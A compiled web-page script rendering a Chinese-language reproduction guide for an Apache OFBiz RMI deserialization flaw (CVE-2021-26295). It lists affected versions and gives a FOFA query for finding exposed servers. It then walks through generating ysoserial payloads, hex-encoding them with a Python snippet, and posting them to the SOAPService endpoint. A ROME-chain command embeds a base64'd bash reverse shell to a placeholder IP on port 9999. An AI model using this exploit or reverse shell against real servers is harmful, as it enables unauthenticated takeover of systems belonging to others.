(window.webpackJsonp=window.webpackJsonp||[]).push([[401],{1937:function(s,a,t){s.exports=t.p+"assets/img/c3afc0d1-7dc6-4161-a0fd-901797bf1a31.898ed31c.png"},2406:function(s,a,t){"use strict";t.r(a);var e=t(75),n=Object(e.a)({},(function(){var s=this,a=s.$createElement,e=s._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"apache-ofbiz-rmi反序列化漏洞-cve-2021-26295"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#apache-ofbiz-rmi反序列化漏洞-cve-2021-26295"}},[s._v("#")]),s._v(" Apache OFBiz RMI反序列化漏洞 CVE-2021-26295")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("OFBiz是基于Java的Web框架，包括实体引擎，服务引擎和基于小部件的UI。")]),s._v(" "),e("p",[s._v("近日，Apache OFBiz官方发布安全更新。Apache OFBiz 存在RMI反序列化前台命令执行，未经身份验证的攻击者可以使用此漏洞来成功接管Apache OFBiz，建议相关用户尽快测试漏洞修复的版本并及时升级。")]),s._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("Apache OFBiz < 17.12.06")]),e("br"),s._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[e("a-button",{attrs:{href:"https://fofa.info/result?qbase64=YXBwPSJBcGFjaGVfT0ZCaXoi"}},[s._v('app="Apache_OFBiz"')])],1),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("利用 "),e("code",[s._v("ysoserial")]),s._v("生成反序列化数据")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://xxx.xxx.xxx.xxx > payload.txt\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("div",{staticClass:"language-python line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-python"}},[e("code",[e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#!/usr/bin/python")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#conding=utf8")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" binascii\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("with")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("open")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'payload.txt'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'rb'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("as")]),s._v(" payload_handle"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n   content "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" payload_handle"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("read"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nstr_hex "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" binascii"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("hexlify"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("content"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("str_hex"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br")])]),e("p",[s._v("发送请求包后查看Dnslog验证漏洞")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("POST /webtools/control/SOAPService \n\n<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header/><soapenv:Body><test:clearAllEntityCaches xmlns:test=\"http://ofbiz.apache.org/service/\"><test:cus-obj>dnslog反序列化数据</test:cus-obj></test:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[s._v("反弹Shell可以使用"),e("code",[s._v("ROME反序列化链")])]),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[s._v("java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME  "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"bash -c {echo,xxxxxxxxxxxxxxxxxxxxxxx}|{base64,-d}|{bash,-i}"')]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" xxd"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("cut")]),s._v(" -f "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("2,3")]),s._v(",4,5,6,7,8,9 -d "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('" "')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("tr")]),s._v(" -d "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("' '")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("tr")]),s._v(" -d "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'\\n'")]),s._v("\n\n"),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("bash")]),s._v(" -c "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1'")]),s._v("   base64加密写入然后执行命令\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1937),alt:"c3afc0d1-7dc6-4161-a0fd-901797bf1a31"}})])],1)}),[],!1,null,null,null);a.default=n.exports}}]);